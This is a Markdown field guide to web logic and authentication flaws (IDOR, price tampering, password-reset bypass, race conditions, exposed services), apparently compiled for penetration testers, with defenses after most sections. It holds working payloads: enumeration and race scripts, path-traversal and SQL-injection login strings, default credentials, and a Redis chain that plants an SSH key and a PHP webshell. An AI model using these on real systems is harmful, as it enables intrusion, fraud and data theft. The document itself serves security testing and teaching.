# Web Logic and Authentication Security

> **Source**: distilled from 88,636 real vulnerabilities in the WooYun database, covering the two categories of logic flaws (8,292) and unauthorized access (14,377)
> **Purpose**: a field reference for logic vulnerabilities and authentication bypass in web-application security testing

---

## 1. Authorization-Bypass Vulnerabilities

### 1.1 Nature of the Vulnerability

The root cause of an authorization-bypass vulnerability is **missing or incomplete authorization checks** — the server does not verify on every resource operation whether the requester has the corresponding permission.

| Type | definition | root cause | risk level |
|------|------|------|----------|
| Horizontal privilege escalation | out-of-bounds access between same-level users | resource ownership not checked | high |
| Vertical privilege escalation | a low-privilege user performs high-privilege operations | role permissions are not checked | critical |

### 1.2 Horizontal Privilege Escalation (IDOR)

**High-Frequency Scenarios and Exploitation Methods**:

```
Scenario 1: ID traversal — auto-increment IDs are predictable
GET /address/edit/?addid=100001  → your own address
GET /address/edit/?addid=100002  → another user's address (unauthorized)

Scenario 2: resource-substitution attack — the modify operation lacks an ownership check
Account A creates invoice ID=1001 → account B replaces ID=1001 when editing → A's invoice is overwritten

Scenario 3: API-parameter traversal — the endpoint verifies login but not permissions
/personal/center/family/{id}/edit → replace the id to leak others' information
```

**Testing Method**:
1. Capture and record the ID parameters in a normal request (uid/orderId/addid, etc.)
2. Replace with another user's ID and observe the response
3. Automated traversal (Burp Intruder or a script)
4. Focus on the four CRUD operations; modify and delete are the most damaging

```python
# IDOR automated-detection approach
def idor_test(base_url, param_name, id_range, session_cookie):
    for id in range(id_range[0], id_range[1]):
        resp = requests.get(
            f"{base_url}?{param_name}={id}",
            cookies={"session": session_cookie}
        )
        if resp.status_code == 200 and "sensitive-data marker" in resp.text:
            print(f"[!] IDOR: {param_name}={id}")
```

**Authorization-Bypass Test Matrix**:

| Operation type | test method | risk level |
|----------|----------|----------|
| View | replace the resource ID | medium |
| Modify | replace the resource ID + data | high |
| Delete | replace the resource ID | critical |
| Create | replace the owning user ID | high |

### 1.3 Vertical Privilege Escalation

**Core Exploitation Methods**:

```http
# An ordinary user tampers with the role marker while editing their profile
POST /updateUser HTTP/1.1
user.aid=3&user.name=test   # aid=3 ordinary user

# Tamper to become administrator
POST /updateUser HTTP/1.1
user.aid=1&user.name=test   # aid=1 super administrator
```

**Detection Key Points**:
- Enumerate role IDs: usually 1=super admin, 2=admin, 3+=ordinary user
- Test role switching: modify the role marker in the request (role/aid/type/level)
- A low-privilege account directly accesses an admin-interface URL
- Tamper with the privilege marker: `isAdmin=0->1`, `role=user->admin`

### 1.4 Defenses

- Enforce ownership checks before resource access: `WHERE id=? AND user_id=<current user>`
- Use UUIDs instead of auto-increment IDs to prevent enumeration
- Log sensitive operations to an audit log
- Enforce least privilege; authorize per-endpoint on the back end
- Authorization logic is centrally managed (middleware/interceptor)

---

## 2. Payment-Logic Vulnerabilities

### 2.1 Nature of the Vulnerability

The core of a payment vulnerability is a **trust-boundary error** — pushing sensitive logic like price computation to the client, without independent server-side validation.

```
Security model: untrusted zone (client) -> trust boundary -> trusted zone (server)
Incorrect implementation: directly accepting the client-submitted price as authoritative
Correct implementation: the client only provides the product ID; the server looks up and computes the price independently
```

### 2.2 Common Scenarios and Exploitation Techniques

**Scenario 1: Direct Amount Tampering**

```http
# Original request
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":299.00}

# Tamper with the request
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}
```

**Scenario 2: Coupon/Discount Logic Abuse**

```
1. Buy item A (59 yuan) to trigger "spend 59, get B for 5.9"
2. Order A+B, pay 64.9 yuan
3. Cancel item A, keep only B
4. Actually buy item B (originally 21 yuan) for 5.9 yuan

Testing approach: partial cancel after a combined order, return after using a coupon, refund after redeeming points
```

**Scenario 3: Virtual-Currency Farming**
- Registration promo grants points -> brute-force the verification code to mass-register -> redeem points for goods

**Scenario 4: Quantity / Negative-Number Attack**
- `count=1 -> count=-1` (a negative number causes a refund)
- `price=100 -> price=-100` (negative amount)

### 2.3 Systematic Testing Method

```
Phase 1: parameter fingerprinting
  - Capture the order-creation endpoint
  - Identify price parameters (price/amount/total/cost/discount)
  - Determine the parameter type (integer/float/string)

Phase 2: boundary-value testing
  - Minimum values: 0, 0.01
  - Negatives: -1, -100, -0.01
  - Formats: scientific notation (1e-10), JSON nesting
  - Precision: floating-point overflow, rounding errors

Phase 3: logic bypass
  - Parameter redundancy: submit multiple price parameters
  - Parameter override: raise the price first, then lower it
  - Coupon stacking: manipulate both price and discount
  - Partially cancel/return after a combined order

Phase 4: validate each stage of the payment flow
  - Order creation -> check the order amount
  - Payment redirect -> verify the payment amount
  - Payment callback -> forge the callback signature
  - Refund flow -> check the refund amount
```

**Advanced Exploitation Techniques**:

```python
# Price tampering + concurrency race
import threading
def create_order():
    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
threads = [threading.Thread(target=create_order) for _ in range(50)]
for t in threads: t.start()
```

```http
# Parameter pollution: some frameworks process duplicate parameters
POST /order/create?price=299.00&price=0.01

# Type-juggling bypass
{"price":"0.01"}     string
{"price":1e-10}      scientific notation
{"price":null}       NULL injection
```

### 2.4 Defenses

```
Layer 1 input validation: accept only the product ID, not price; amounts are positive with at most 2 decimals
Layer 2 business logic: the server computes the price independently; reject / manually review when the price deviates beyond a threshold
Layer 3 data integrity: order signing (HMAC) to prevent tampering; timestamps to prevent replay; idempotency to prevent duplication
Layer 4 payment validation: callback amount = order amount; a strict state machine; end-to-end audit logs
```

---

## 3. Password-Reset Vulnerabilities

### 3.1 Nature of the Vulnerability

The essence of a password-reset vulnerability is a **broken identity-verification chain** — some step in the reset flow does not correctly bind the user's identity.

### 3.2 Four Major Vulnerability Patterns

**Pattern A: Verification-Code Echo Leak**

```http
POST /sendSmsCode HTTP/1.1
phone=13888888888

# The response directly contains the verification code
{"code":0,"data":{"verifyCode":"123456"}}
```

Detection method: intercept the send-verification-code response and search for a 4-6 digit number.

**Pattern B: Verification Code Unbound from User**

```
1. Receive verification code A on your own phone number
2. Initiate password recovery for the target account
3. Complete verification using code A (not bound to a user identity)
Root cause: the verification code is only checked for validity, not for the owning user
```

**Pattern C: Reset Steps Can Be Skipped**

```
Normal: enter the account -> identity verification -> reset the password -> done
Attack: enter the account -> [skip] -> directly access the password-reset page

Implementation:
1. Analyze the front-end JS to find each step's URL
2. Directly access the step-3 URL
3. Use F12 to modify the DOM: hide the verification step, show the reset step
```

**Pattern D: Credential Parameter Controllable**

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
# Vulnerability: username comes from the client and can be tampered to any user
```

### 3.3 Testing Process

```
Initiate a password reset
  +-- Capture and analyze the response -> does it contain the verification code -> Pattern A
  +-- Analysis-and-verification flow
  |     +-- multi-step -> try skipping intermediate steps -> Pattern C
  |     +-- single step -> check parameter binding
  |           +-- user ID controllable -> parameter tampering -> Pattern D
  |           +-- bound to the session -> session-fixation test
  +-- Verification-code mechanism
        +-- Is the verification code bound to the user -> Pattern B
        +-- Is the verification code brute-forceable (no rate limit)
        +-- Does the verification code have an expiry
```

### 3.4 Defenses

- Bind the verification code to the user's session and check ownership
- The verification code is single-use + expires in 60 seconds
- Reset tokens are single-use and unpredictable
- Server-side state validation throughout the flow; no step-skipping
- Lock after 5 failures to prevent brute-forcing

---

## 4. Business-Logic Flaws

### 4.1 Nature of the Vulnerability

Root-cause matrix of business-logic flaws:

| Tier | flaw type | typical manifestation |
|------|----------|----------|
| Business layer | process-design flaws | steps can be skipped, state can be forged |
| Endpoint layer | excessive trust in parameters | client-side validation, no server-side validation |
| Authentication layer | credential-management flaws | token leak, session fixation |
| Authorization layer | blurred permission boundaries | horizontal/vertical privilege escalation |

### 4.2 CAPTCHA Bypass

**Bypass 1: Verification Code Does Not Refresh**
- After a failed login the verification code does not refresh, so the same code can be reused
- Exploitation: identify once manually, then brute-force the password with the fixed verification code

**Bypass 2: Verification Code Is Brute-Forceable**
- 4-6 digits, no attempt/rate limit
- A brute-force space of 10000-1000000 completes in about 30 seconds with 30 threads

**Bypass 3: Front-End-Only Validation**
- The verification code is only checked in front-end JS; bypass it by deleting the front-end check or calling the API directly

**Verification-Code Security Checklist**:
- Whether the verification code leaks in the response
- Whether it is bound to the session/user
- Whether it has an expiry (recommended: 60 seconds)
- Whether a failed verification forces a refresh
- Whether there is a rate limit (recommended: 5 per minute)
- Is the complexity sufficient (recommended: 6-char alphanumeric mix)

### 4.3 Race Condition

Applicable scenarios: coupon use, points redemption, inventory deduction, balance payment

```python
import threading, requests
def redeem():
    requests.post("/redeem", data={"points":1000, "item":"iPhone"})

# 100 concurrent requests, trying to redeem the same points multiple times
threads = [threading.Thread(target=redeem) for _ in range(100)]
for t in threads: t.start()
```

Root cause: checking the balance and deducting it are not atomic, so under concurrency the check can pass multiple times.

### 4.4 Systematic Parameter-Tampering Method

| Parameter type | tampering direction | example |
|----------|----------|------|
| User ID | replace with another user | uid=1001->1002 |
| Amount | reduce/zero-out/negative | price=100->0.01 |
| Quantity | negative number | count=1->-1 |
| Status | flip a boolean | isPaid=false->true |
| Role | escalate privileges | role=user->admin |
| Time | extend the validity period | expireTime->2099-12-31 |

### 4.5 Business-Process Reverse-Analysis Method

```
Step 1: draw the complete business-process diagram
Step 2: identify the validation point at each stage
Step 3: assess whether the validation can be bypassed (front end/back end? replayable? parameters controllable?)
Step 4: design bypass test cases

Example (password-reset flow):
[enter account] -> [send verification code] -> [verify identity] -> [set new password]
     |              |              |              |
  Account enumeration      verification-code leak      step skipping      parameter tampering
```

### 4.6 Defensive Principles

- **Server is authoritative**: all validation happens server-side; front-end validation is for UX only
- **Atomic operations**: use transactions + locks for critical business logic (deductions/inventory)
- **State machine**: the business flow advances strictly by a state machine; no step-skipping
- **Replay protection**: design critical endpoints to be idempotent; requests carry a timestamp + signature

---

## 5. Authentication Bypass

### 5.1 Nature of the Vulnerability

The core of authentication bypass is a **broken trust chain**: the system wrongly trusts an identity claim from an untrusted source.

### 5.2 Cookie/Session Forgery

```
# Write directly to the cookie to gain an identity
GET /registeruser/CookInsert?userAccount=admin&inner=1
-> Write an admin identity into the cookie to directly obtain an administrator session

# The identity token in the cookie is predictable
Cookie: admin=true; userId=1
-> Changing the cookie value switches identity
```

JWT bypass:

| Technique | payload |
|------|---------|
| None algorithm | alg: none |
| Weak key | brute-force the HS256 key |
| Algorithm confusion | switch RS256 to HS256, sign with the public key |

### 5.3 Response-Tampering Bypass

```
Normal: request verification -> {"status":"0","msg":"wrong verification code"} -> stay on the verification page
Attack: request verification -> intercept the response -> change it to {"status":"1","msg":"success"} -> proceed to the next step
```

Applicable when: the client controls the flow based on the response status + the server does not re-validate subsequent steps.

### 5.4 IP Spoofing / Header Bypass

```http
# Common headers to bypass an IP whitelist
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Host: localhost
```

### 5.5 Path Bypass

```
# Case obfuscation
/ADMIN/  /Admin/  /aDmIn/

# URL-encoding bypass
%2e%2e%2f = ../
%252e%252e%252f = ../ (double encoding)

# Null-byte truncation
../../../etc/passwd%00.jpg

# Suffix-append bypass
/admin -> /admin/  /admin;.js  /admin%23
```

### 5.6 Unauthorized Admin-Panel Access

High-frequency unauthorized paths:

```
# Web Middleware
/console/              (WebLogic)
/manager/html          (Tomcat)
/jmx-console/          (JBoss)
/actuator/env          (Spring Boot)
/actuator/heapdump     (Spring Boot, may leak passwords)

# API Endpoints
/swagger-ui.html       (API documentation)
/api-docs              (API documentation)
/api/configs           (config disclosure)

# Debug / admin
/admin/index.jsp
/phpMyAdmin/
/druid/index.html      (Druid monitoring)
```

Middleware weak-credential quick reference:

| Middleware | common weak credentials |
|--------|-----------|
| Tomcat | admin:admin, tomcat:tomcat |
| WebLogic | weblogic:weblogic, weblogic:12345678 |
| JBoss | admin:admin (or no authentication) |

### 5.7 Unauthorized Database/Service Access

| Service | port | verification command | exploitation method |
|------|------|----------|----------|
| Redis | 6379 | redis-cli -h IP info | write an SSH key / webshell / scheduled task |
| MongoDB | 27017 | mongo IP:27017 | connect directly without auth, export all data |
| Elasticsearch | 9200 | curl IP:9200/_cat/indices | read index data |
| Memcached | 11211 | echo stats, nc IP 11211 | data leak |
| Docker API | 2375 | curl IP:2375/info | container escape / RCE |

Redis unauthorized-access exploitation chain (high risk):

```bash
redis-cli -h target
# Write an SSH public key
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save

# Write a webshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php system($_GET['c']);?>"
save
```

### 5.8 Session Bypass

```
# Session-ID leak (logs/URL)
/logs/ctp.log -> contains a session ID -> use it directly

# Session-fixation attack
Force the user to use a session ID chosen by the attacker

# Session prediction
A weak session generated from a timestamp/sequence number -> the next session is predictable
```

### 5.9 Universal Password (SQL-Injection Login)

```
Username: ' or 1=1--
Password:   any

Username: admin'--
Password:   any
```

### 5.10 Authentication-Bypass Test Checklist

| Test item | method | tool |
|--------|------|------|
| Cookie forgery | modify the user-identifier field | BurpSuite |
| Session fixation | reuse another user's session | packet-capture tool |
| Response tampering | modify the returned status code | BurpSuite |
| IP spoofing | add X-Forwarded-For | curl/Burp |
| Front-end bypass | modify the JS logic | DevTools |
| JWT tampering | none algorithm / weak key | jwt.io/hashcat |
| Path bypass | case/encoding/truncation | manual + dictionary |
| Weak credentials | try default credentials | Hydra |
| SQL-injection login | universal password | manual |

### 5.11 Defenses

| Aspect | measure |
|------|------|
| Network | internal services not exposed to the internet, accessed via VPN/bastion |
| Authentication | enforce complex passwords, disable default accounts, enable MFA |
| Authorization | authorize per-endpoint on the back end, least-privilege principle |
| Session | regenerate the session ID after login, HttpOnly+Secure |
| Monitoring | anomalous-login alerts, lockout on failed attempts, log auditing |
| Hardening | disable debug endpoints, remove default admin pages |

---

## 6. Systematic Testing Framework

### 6.1 Four-Phase Testing Method

```
Phase 1: intelligence gathering
  - Enumerate all features and endpoints
  - Draw the business-process diagram
  - Identify sensitive operations (payment/reset/privilege change)
  - Determine how controllable the parameter is

Phase 2: threat modeling
  - Analyze each endpoint's input parameters and trust boundary
  - Mark server-side vs front-end validation
  - Build an attack tree (categorized by authorization/payment/authentication)
  - Prioritize (high impact x high likelihood)

Phase 3: vulnerability verification
  - Test each item in priority order
  - Record the PoC (request/response screenshots)
  - Assess the impact scope (data volume/number of users/amount)

Phase 4: report output
  - Vulnerability description + reproduction steps
  - Root-cause analysis + impact assessment
  - Remediation advice (short-term + long-term)
  - Risk rating (CVSS)
```

### 6.2 High-Frequency Vulnerability-Pattern Quick Reference

| Vulnerability pattern | detection signal | quick-verification method |
|----------|----------|-------------|
| IDOR | the URL/parameter contains an auto-increment ID | replace the ID and see if it returns others' data |
| Amount tampering | the request contains price/amount | change to 0.01 and observe the order |
| Verification-code echo | capture after sending the code | search the response for a 4-6 digit number |
| Step skipping | multi-step flow | directly access a later step's URL |
| Response tampering | the client redirects based on status | change status=1 to see if it lets you through |
| Unauthorized admin panel | directory scanning finds the admin path | access it directly to see whether login is required |
| Weak credentials | found a login page | try default credentials like admin/admin |
| Race condition | balance/inventory/coupon operations | send 50+ concurrent requests and observe over-deduction |

### 6.3 Recommended Field Tools

| Tool | core use | applicable scenario |
|------|----------|----------|
| BurpSuite | traffic interception, parameter tampering, replay | core tool for all scenarios |
| Postman | API testing, batch requests | endpoint-logic testing |
| Hydra | password brute force | weak credentials / credential stuffing |
| OWASP ZAP | automated scanning | initial discovery |
| Custom scripts | concurrency testing, ID traversal | race condition / IDOR |

---

*Document version: v1.0*
*Data source: WooYun vulnerability database (88,636 entries): logic flaws (8,292) + unauthorized access (14,377)*
*Generated: 2026-02-06*
